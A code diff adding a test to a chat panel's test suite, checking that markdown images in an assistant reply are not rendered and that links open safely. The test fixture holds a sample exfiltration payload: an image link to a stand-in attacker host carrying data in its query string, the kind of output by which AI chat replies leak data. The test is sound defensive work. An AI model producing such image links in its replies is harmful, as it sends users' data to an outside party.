@@ -137,6 +137,18 @@ describe('ChatPanel questions', () => {
   })
 })
 
+describe('ChatPanel markdown', () => {
+  it('never renders an image from a reply (its alt text instead); links open apart from this page', () => {
+    const transcript = { sessionId: 's', streaming: false, messages: [{ role: 'assistant' as const,
+      content: 'Done. ![levels](https://attacker.example/c.png?d=L1,L2) See [the docs](https://example.com/docs).' }] }
+    const html = renderToStaticMarkup(<ChatPanel title="t" transcript={transcript} />)
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('attacker.example')
+    expect(html).toContain('[levels]')
+    expect(html).toContain('<a href="https://example.com/docs" target="_blank" rel="noopener noreferrer">the docs</a>')
+  })
+})
+
 describe('format', () => {
   it('shows the token prefix only, and the time left', () => {
     expect(tokenPrefix('tok_abcdef0123456789')).toBe('tok_ab...')
